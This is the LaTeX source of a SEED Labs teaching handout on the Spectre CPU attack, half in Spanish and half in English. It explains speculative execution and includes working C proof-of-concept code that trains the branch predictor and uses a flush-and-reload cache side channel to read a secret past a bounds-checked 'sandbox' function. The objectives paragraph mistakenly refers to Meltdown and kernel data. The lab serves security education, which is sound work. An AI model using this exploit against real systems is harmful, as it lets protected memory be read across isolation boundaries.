%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Copyright by Wenliang Du.                                       %%
%%  This work is licensed under the Creative Commons                %%
%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
%%  To view a copy of this license, visit                           %%
%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\commonfolder}{../../common-files}

\input{\commonfolder/header}
\input{\commonfolder/copyright}


\lhead{\bfseries SEED Labs -- Laboratorio del Ataque Spectre}

\def \code#1 {\fbox{\scriptsize{\texttt{#1}}}}

\begin{document}


\newcommand{\spectreFigs}{./Figs}

\begin{center}
{\LARGE Laboratorio del Ataque Spectre}
\end{center}


\seedlabcopyright{2018}



% *******************************************
% SECTION
% ******************************************* 
\section{Introducci´n}

Descubierta en el 2017 y publicada en Enero del 2018, el ataque Spectre explota una serie de vulnerabilidades críticas que existen en muchos procesadores modernos, incluyendo procesadores Intel, AMD y ARM~\cite{Kocher2018spectre}.
Estas vulnerabilidades le permiten a un programa romper con la isolación inter y intra proceso, por lo que un programa malicioso puede leer data de un area de memoria que no le pertenece. En un escenario normal tal acceso no es permitido debido a las protecciones de hardware (para la isolación inter-proceso) o protecciones de software (para la isolación intra-proceso), pero esta vulnerabilidad existente a nivel diseño de las CPUs permite evadir este tipo de proteccioness. Dado que esta vulnerabilidad existe a nivel de hardware, es muy difícil resolver el problema de raíz, al menos que se cambie el procesador de la PC. La vulnerabilidad Spectre representa un tipo especial de falla en el diseño de los CPUs, junto con la vulnerabilidad Meltdown, nos proveen una invaluable lección para la educación de la seguridad.


\underline{Objetivos del Aprendizaje} El objetivo de este laboratorio es que los estudiantes puedan aprender y logren experiencia en el Ataque Spectre. El ataque por sí mismo es algo sofisticado, es por eso que para una mejor compresión del mismo y de como atacarlo, lo hemos fragmentado en pequeños pasos. Una vez que los estudiantes entiendan cada uno de los pasos, no debería de resultarles difícil reunir todos los elementos y proceder a realizar el ataque. Los estudiantes usarán el Ataque Meltdown para mostrar en pantalla/obtener e imprimir un dato secreto guardado dentro del kernel.

Este laboratorio cubre los siguientes tópicos:


\begin{itemize}[noitemsep]
\item Ataque Spectre
\item Ataque Side channel
\item CPU caching
\item Ejecución fuera de orden y Branch Prediction dentro de la microarquitectura del CPU
\end{itemize}



\paragraph{Lecturas y Videos.}
Para una cobertura más detallada sobre el ataque Spectre puede consultar:

\begin{itemize}
\item Capítulo 14 del libro de SEED, \seedbook
\item Sección 8 del curso de SEED en Udemy, \seedcsvideo
\end{itemize}


\paragraph{Entorno de Labooratorio.} \seedenvironmentAB

Al usar este laboratorio, los instructores deben de tener en cuenta que:
Primero, aunque la vulnerabilidad Spectre es una falla común de diseño dentro de los CPUs Intel, AMD y ARM, este laboratorio ha sido solamente testeado en CPUs Intel.
Segundo, Intel está trabajando en la solución de esta vulnerabilidad, por lo que si un estudiante usa máquina con un procesador Intel muy nuevo, el ataque puede que no funcione. Hasta Mayo del 2021 no se reportaron problemas pero a medida que pasa el tiempo puede que esto cambie.

\paragraph{Agradecimientos} Este laboratorio ha sido desarrollado con la ayuda de 
Hao Zhang y Kuber Kohli, estos estudiantes son estudiantes graduado en el Departamento de Ingeniería Electrónica y Ciencias de la Computación de la Universidad de Syracuse.


% *******************************************
% SECTION
% ******************************************* 
%\section{Code Compilation}
%\section{Tasks 1-2: Side Channel Attacks}


\newcommand{\sideChannelFigs}{../Meltdown_Attack/Figs}
\input{../Meltdown_Attack/Side_Channel_Attack.tex}




% *******************************************
% SECTION
% ******************************************* 
\section{Tarea 3: Ejecución Fuera de Orden y Branch Prediction}

El objetivo de esta tarea es entender la ejecución fuera de orden en los CPUs. Nos valdremos de un experimento para que los estudiantes puedan entender este tipo de ejecución.


\subsection{Ejecución Fuera de Orden} 

El ataque Spectre se basa en una característica importante que está implementada en la mayoría de los CPUs. Para entenderla, veamos el siguiente código.
Este código chequea que \texttt{x} sea menor que \texttt{size}, si esto es verdadero la variable data será actualizada. Asuma que el valor de \texttt{size} es 10, por lo que si \texttt{x} es igual a \texttt{15}, el código de la Línea 3 no será ejecutado.


\begin{lstlisting}
1  data = 0;
2  if (x < size) {   
3     data = data + 5; 
4  }
\end{lstlisting}
 
La sentencia del código anterior es verdadera cuando se mira desde fuera del CPU. 
Sin embargo esto no es así si nos metemos dentro del mismo y observamos la secuencia de ejecución a nivel de microarquitectura. Si hacemos esto, descubriremos que la Línea 3 puede ser ejecutada de forma exitosa aunque el valor de \texttt{x} sea mayor a \texttt{size}. Esto se debe a una técnica de optimización implementada en los CPUs modernos, llamada ejecución fuera de orden (out-of-order execution).

La ejecución fuera de orden es una técnica de optimización que le permite a la CPU maximizar la utilización de todas sus unidades de ejecución. En lugar de ejecutar las instrucciones en el orden estricto en que fueron establecidas, los CPUs modernos de alta performance permiten que la ejecución fuera de orden usen todas sus unidades de ejecución para optimizar la performance y manejar de manera eficiente el uso de recursos, de otra forma estaríamos en un escenario donde una instrucción esperaría que termine la ejecución de una instrucción anterior teniendo la posibilidad de poder ser ejecutada en unidades de ejecución en el CPU que están ociosas

Si observamos el código de ejemplo anterior, y nos posicionamos a un nivel de microarquitectura, la Línea 2 implica dos operaciones: Cargar el valor de \texttt{size} de la memoria y comparar el valor con \texttt{x}. Si la variable  \texttt{size} no está dentro de la caché del CPU, puede tomar cientos de ciclos de reloj del CPU antes de que este valor sea leído.
En lugar de esperar ociosamente a que esto suceda, los procesadores modernos tratan de predecir el resultado de esta comparación, y correr de forma especulativa diferentes branches basados en estimaciones. Dado que dicha ejecución comienza antes de que la comparación termine, la ejecución es llamada ejecución fuera de orden, el CPU guarda su estado actual y los valores de los registros.
Cuando el valor de  \texttt{size} finalmente está disponible, el CPU chequea el resultado actual. Si la predicción es verdadera, el proceso especulativo anteriormente realizado se usado y esto implica una ganancia significativa en la perfomance. Si la predicción es errónea el CPU volverá a su estado inicial, por lo que todos los resultados provocados por la ejecución fuera de orden serán descartados como si esto nunca hubiera pasado. Ese es el porque si miramos desde afuera la Línea 3 del código pareciera que nunca fue ejecutada.
La Figura \ref{spectre:fig:spectre} ilustra la ejecución fuera de orden causada por la ejecución de la Línea 2.

\begin{figure}[htb]
\centering
\includegraphics[width=0.75\textwidth]{\spectreFigs/spectre.pdf}
\caption{Ejecución Especulativa (out-of-order execution)}
\label{spectre:fig:spectre}
\end{figure}

Tanto Intel como otros fabricantes de CPUs cometieron algunos errores graves en el diseño de la técnica de la ejecución fuera de orden (out-of-order execution).
En el contexto de este diseño, se borrán los efectos de la ejecución fuera de orden tanto en los registros como en la memoria si es que tal ejecución no se supone que deba de ocurrir. Sin embargo, olvidaron algo, los efectos en las caches del CPU.
Durante la ejecución fuera de orden, la memoria a la que se intenta acceder es guardada tanto en en un registro como en la caché. Si la ejecución fuera de orden debe de ser descartada o mejor dicho los efectos de la misma, la caché en donde se guardan estos resultados o efectos, también debería de ser descartados. Desafortunadamente este no es el caso en la mayoría de los CPUs.
Por lo tanto, esto crea un efecto observable.
Utilizando la técnica de side channel descrita en las Tareas 1 y 2,
se puede observar tal efecto. El ataque Spectre usa de manera inteligente este
efecto observable para descubrir valores secretos que se suponen protegidos.



%\paragraph{More details on speculative execution?} To understand 
%the benefit of speculative execution, Let us see some data. 
%When a micro-processor reads from the main memory i.e. RAM, the read
%timings are about 60 nanoseconds (60 billionths of a second). Even though
%it appears to be lightning fast to humans, to
%micro-processor it is a really long time. A micro-processors can have cycle times as short as
%2 nanoseconds. This cycle time is the time between one RAM access to the time when another
%access can be started. The cycle time are different than clock cycle which is number of cycles
%per second. So, to a microprocessor with cycle time with 2 nanosecond, 60 nanoseconds of read
%time is really long. The L2 cache are generally at least twice as fast as RAM while L1 cache
%are built directly in the micro-processor so the read is done at the micro-processor speed.


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{El Experimento}

En esta tarea, usaremos un experimento para observar los efectos causados por la ejecución fuera de orden. El código usado en este experimento es mostrado a continuacióon.
Algunas de las funciones usada en el código son las mismas que se usaron en tareas anteriores, por lo que no serán repetidos.

\begin{lstlisting}[caption=\texttt{SpectreExperiment.c}, label=spectre:list:outoforder]
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

int size = 10;
uint8_t array[256*4096];
uint8_t temp = 0;

void victim(size_t x) 
{
  if (x < size) {                          (*@\ding{192}@*)
     temp = array[x * 4096 + DELTA];       (*@\ding{193}@*)
  }
}

int main() 
{
  int i;

  // FLUSH the probing array
  flushSideChannel();

  // Train the CPU to take the true branch inside victim()
  for (i = 0; i < 10; i++) {               (*@\ding{194}@*)
      victim(i);                           (*@\ding{195}@*)
  }

  // Exploit the out-of-order execution 
  _mm_clflush(&size);                      (*@\ding{80}@*)
  for (i = 0; i < 256; i++)  
      _mm_clflush(&array[i*4096 + DELTA]);
  victim(97);                              (*@\ding{196}@*)

  // RELOAD the probing array
  reloadSideChannel();
  return (0);
}
\end{lstlisting}

Para que las CPUs puedan realizar la ejecución especulativa, deberían de poder predecir el resultado de la condición IF. Las CPUs guardan un registro de los branches que fueron tomados en el pasado y luego usa estos resultados para predecir que branch debería de ser tomado en una ejecución especulativa.
Además, si quisieramos que la CPU tome un branch en particular dentro de la ejecución especulativa, deberíamos de entrenar al CPU, por lo que nuestro branch elegido se puede convertir en el resultado de esa predicción. Este entrenamiento es hecho dentro del bloque \texttt{for} que comienza en la Línea \ding{194}. 
Dentro de este for-loop, invocamos a la función \texttt{victim()} con un argumento cuyo valor es pequeño (este va de 0 a 9).
Estos valores son menores que el valor \texttt{size}, por lo que el true-branch para esta condición en la Línea \ding{192} es siempre el que se elige. Esta es la fase de entrenamiento, que esencialmente entrena a la CPU que espera a que la 
condición IF sea verdadera.

Una vez entrenada la CPU, invocamos a la función \texttt{victim()} (Línea \ding{196}) pero esta vez enviamos un parámetro con un valor más grande (\texttt{97}). Este valor es mas grande que \texttt{size}, por lo que se tomará el false-branch y no el true-branch. Sin embargo, hemos flusheado de la memoria la variable \texttt{size}, por lo que obtener su valor desde memoria puede llevar un rato. Aquí es donde la CPU hará las predicciones y empezará la ejecución especulativa.



% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Tarea 3} 

Por favor compile el programa \texttt{SpectreExperiment.c} mostrado en el Fragmento \ref{spectre:list:outoforder}  (Vea la Sección \ref{sidechannel:sec:compilation} para más detalles en como realizar la compilación); ejecute el programa y describa sus observaciones. Puede que haya algo de ruído en el side channel debido al cacheo de datos extras por el CPU, nos encargaremos de reducir este ruído mas adelante, por ahora puede ejecutar la tarea varias veces con el objetivo de observar sus efectos. Por favor observe cuando la Línea \ding{193} es ejecutada y cuando no en el caso que el valor when \texttt{97} sea usado en la función \texttt{victim()}. 
En conjunto con lo anterior, por favor haga lo siguiente:


\begin{itemize}
\item Comente la línea marcada con \ding{80} y ejecute todo nuevamente. Explique su observación. Después de terminar con este experimento, descomemente lo que comentó anteriormente, para así no afectar las tareas que vendrán después.

\item Reemplace la Línea \ding{195} con \texttt{victim(i + 20)}; ejecute el código nuevamente y explique su observación.
%Because \texttt{i + 20} is always larger than the value 
%of \texttt{size}, the false-branch of the if-condition in Line \ding{192} will always be 
%executed. Basically, we are training the CPU to go to the false-branch.
%That should affect the out-of-order execution when 
%\texttt{victim()} is called at Line \ding{195}.   
\end{itemize}
 



% *******************************************
% SECTION
% ******************************************* 
\section{Tarea 4: El Ataque Spectre}

Como hemos visto en las tareas anteriores, podemos hacer las CPUs ejecuten el true-branch de un IF, aunque la condición sea falsa. Si la ejecución fuera de orden no produce un efecto visible, este no es un problema, dado que la mayoría de las CPUs que utilizan este mecanismo no limpian su caché, esto hace que se dejen rastros en esta caché de los resultados producidos por esta ejecución fuera de orden. El ataque Spectre usa estos rastros para robar datos secretos.

Estos datos pueden ser datos de un proceso en ejecución que no es el que está siendo ejecutado o del proceso que está siendo ejecutado. Si los datos son de otro proceso, el mecanismo de isolación del mismo se realiza a nivel hardware, en cambio si los datos son del mismo proceso, la isolación se da a nivel de software, como puede ser un mecanismo de sandbox.
El ataque de Spectre puede ser usado para atacar ambos mecanismos de isolación.
Sin embargo obtener los datos de un proceso que usa la isolación por hardware es mucho más difícil que aquel proceso que usa la isolación por software. 
Para hacer esto más sencillo, este laboratorio se centrará solamente en obtener los datos pertenecientes al proceso en ejecución.

Cuando en un navegador se visitan diferentes páginas webs en servidores remotos comúnmente se usa el mismo proceso para abrirlas. El mecanismo de sandbox implementado dentro del navegador provee un entorno isolado para estas páginas, por lo que una página no podrá acceder a los datos de otra página.
La mayoría de estas protecciones de software se basan en chequear ciertas condiciones para determinar si un determinado acceso es permitido o no. 
Podemos evadir este tipo de chequeo de acceso usando el ataque Spectre, valiéndonos de la ejecución fuera de orden del CPU sobre el branch del código que se intenta proteger incluso cuando esa condición sea falsa.


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{El Setup para el Experimento} 


\begin{figure}[htb]
\centering
\includegraphics[width= 0.7\textwidth]{\spectreFigs/buffer_new.pdf}
\caption{Experiment setup: the buffer and the protected secret}
\label{spectre:fig:buffer}
\end{figure}

Figure~\ref{spectre:fig:buffer} illustrates the setup for the experiment.
In this setup, there are two types of regions: restricted region and non-restricted region.
The restriction is achieved via an if-condition implemented in a sandbox function
described below. The sandbox function returns the value of \texttt{buffer[x]} for an \texttt{x}
value provided by users, only if \texttt{x} is between the buffer's
lower and upper bounds.
Therefore, this sandbox function
will never return anything in the restricted area to users.


\begin{lstlisting}
unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x <= bound_upper && x >= bound_lower) {
     return buffer[x];
  } else {
     return 0;
  }
}
\end{lstlisting}

There is a secret value in the restricted area (either above the buffer
or below it), and the secret's address is known to the attacker, but
the attacker cannot directly access the memory holding the secret value.
The only way to access the
secret is through the above sandbox function. From the previous section, we have learned that
although the true-branch will never be executed if \texttt{x} is larger than the buffer size,
at microarchitectural level, it can be executed and some traces can be left behind
when the execution is reverted.


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{El Programa usado por el Experimento}


The code for the basic Spectre attack is shown below. In this code, there is a
secret defined in Line \ding{192}. Assume that we cannot directly
access the \texttt{secret}, \texttt{bound\_lower}, or 
\texttt{bound\_upper} variables (we do assume that we
can flush the two bound variables from the cache). 
Our goal is to print out the secret
using the Spectre attack. The code below only steals the first byte of the secret. Students can
extend it to print out more bytes. 


\begin{lstlisting}[caption=\texttt{SpectreAttack.c}, label=spectre:list:spectreattack]
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
char    *secret    = "Some Secret Value";     (*@\ding{192}@*)
uint8_t array[256*4096];

// Sandbox Function
uint8_t restrictedAccess(size_t x)
{
  if (x <= bound_upper && x >= bound_lower) {
     return buffer[x];
  } else { return 0; }
}

void spectreAttack(size_t index_beyond)
{
  int i;
  uint8_t s;
  volatile int z;

  // Train the CPU to take the true branch inside restrictedAccess().
  for (i = 0; i < 10; i++) {
      restrictedAccess(i);
  }

  // Flush bound_upper, bound_lower, and array[] from the cache.
  _mm_clflush(&bound_upper);
  _mm_clflush(&bound_lower);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }
  for (z = 0; z < 100; z++)  {   }

  s = restrictedAccess(index_beyond);      (*@\ding{193}@*)
  array[s*4096 + DELTA] += 88;             (*@\ding{194}@*)         
}

int main() {
  flushSideChannel();
  size_t index_beyond = (size_t)(secret - (char*)buffer);  (*@\ding{195}@*)
  printf("secret: %p \n", secret);
  printf("buffer: %p \n", buffer);
  printf("index of secret (out of bound): %ld \n", index_beyond);
  spectreAttack(index_beyond);
  reloadSideChannel();
  return (0);
}
\end{lstlisting}


Most of the code is the same as that in Listing~\ref{spectre:list:outoforder}, so
we will not repeat their explanation here. The most important part is 
in Lines \ding{193}, \ding{194}, and \ding{195}. Line \ding{195}
calculates the offset of the secret from the beginning of the buffer~(we assume that 
the address of the secret is known to the attacker; in real attacks, there are many ways for 
attackers to figure out the address, including guessing).
The offset is definitely beyond the scope of the buffer, so
it is larger than the upper bound of the buffer or smaller than the 
lower bound (i.e., a negative number). The offset
is fed into the \texttt{restrictedAccess()} function.
Since we have trained the CPU to take the true-branch inside
\texttt{restrictedAccess()}, the CPU will return \texttt{buffer[index\_beyond]}, which contains
the value of the secret, in the out-of-order execution. 
The secret value then causes its corresponding element in \texttt{array[]} to
be loaded into cache. All these steps will eventually be reverted, so 
from the outside, only zero is returned from \texttt{restrictedAccess()}, not the value of the secret.
However, the cache is not cleaned, and \texttt{array[s*4096 + DELTA]} is still kept in
the cache. Now, we just need to use the side-channel technique to figure out which element of the
\texttt{array[]} is in the cache.  


\paragraph{The Task.} Please compile and execute 
\texttt{SpectreAttack.c}. Describe your observation and note whether you are able to steal the
secret value. If there is a lot of noise in the side channel, you may not get consistent results 
every time. To overcome this,
you should execute the program multiple times and see whether you can get the secret value. 




% *******************************************
% SECTION
% ******************************************* 
\section{Tarea 5: Mejorando la Precisión del Ataque}


In the previous tasks, it may be observed that the results do have some noise and the results
are not always accurate. This is because CPU sometimes load extra values in cache expecting
that it might be used at some later point, or the threshold is not very accurate. 
This noise in cache can affect the results of our
attack. We need to perform the attack multiple times; instead of doing it manually,
we can use the following code to perform the task automatically.

We basically use a statistical technique.
The idea is to create a score array of size 256, one element for each possible
secret value. We then run our attack for multiple times. Each time, if our
attack program says that \texttt{k} is the secret (this result may be
false), we add \texttt{1} to \texttt{scores[k]}.  After running the attack for many
times, we use the value \texttt{k} with
the highest score as our final estimation of the secret.  This will produce
a much reliable estimation than the one based on a single run. The revised
code is shown in the following.


%One reason for the noise was the way we
%probe the array to read from the side channel. Till now, we were reading the array
%sequentially. To increase the performance, the CPU loads a lot of values from the $array$ into
%the cache. To prevent this, we use the code in line \ding{192}. The code simply assigns a value
%between 0 \& 255 to $random\_i$ and the value is not repeated. Since, the value is randomly
%selected the CPU does not load the extra values into the cache reducing the noise. 


\begin{lstlisting}[caption=\texttt{SpectreAttackImproved.c}]
static int scores[256];

void reloadSideChannelImproved()
{
  ......
  for (i = 0; i < 256; i++) {
     ......
     if (time2 <= CACHE_HIT_THRESHOLD)
        scores[i]++; /* if cache hit, add 1 for this value */
  }
}

void spectreAttack(size_t index_beyond)
{
  ... omitted: same as that in SpectreAttack.c ...
}

int main() {
  int i;
  uint8_t s;
  size_t  index_beyond = (size_t)(secret - (char*)buffer);

  flushSideChannel();
  for(i=0;i<256; i++) scores[i]=0;

  for (i = 0; i < 1000; i++) {
    printf("*****\n");                 (*@\ding{192}@*)
    spectreAttack(index_beyond);
    usleep(10);                        (*@\ding{193}@*)
    reloadSideChannelImproved();
  }

  int max = 0;                     
  for (i = 0; i < 256; i++){
   if(scores[max] < scores[i])
     max = i;
  }

  printf("Reading secret value at index %ld\n", index_beyond);
  printf("The  secret value is %d(%c)\n", max, max);
  printf("The number of hits is %d\n", scores[max]);
  return (0);
}
\end{lstlisting}

\paragraph{Your tasks.} Please compile and run \texttt{SpectreAttackImproved.c},
and do the following tasks:

\begin{itemize}
  \item You may observe that when running the code above, 
        the one with the highest score is very likely to be 
        \texttt{scores[0]}. Please figure out why, and fix the code above,
        so the actual secret value (which is not zero) will be printed out. 
	
  \item Line~\ding{192} seems useless, but from our experience on SEED Ubuntu 20.04, without this line,
        the attack will not work. On the SEED Ubuntu 16.04 VM, there is no need for this line. 
	We have not figured out the exact reason yet, so if you can, your instructor will
	likely give you bonus points. 
	Please run the program with and without this line, and describe your observations. 

  \item Line~\ding{193} causes the program to sleep for 10 microseconds. How long the program
        sleeps does affect the success rate of the attack. Please try several other values,
	and describe your observations. 
\end{itemize}
 



% *******************************************
% SECTION
% ******************************************* 
\section{Tarea 6: Steal the Entire Secret String}

In the previous task, we  just read the first character of the \texttt{secret}
string. In this task, we need to print out the entire string using the 
Spectre attack. Please write your own code or extend the code in Task 5; include your
execution results in the report.


% *******************************************
% SECTION
% ******************************************* 
\section{Informe del Laboratorio}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\input{\commonfolder/submission}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


% *******************************************
% SECTION
% *******************************************
\section*{Agradecimientos}

\input{\commonfolder/acknowledgments}



%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\bibliographystyle{plain}
\def\baselinestretch{1}
\bibliography{BibMeltdownSpectre}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\end{document}


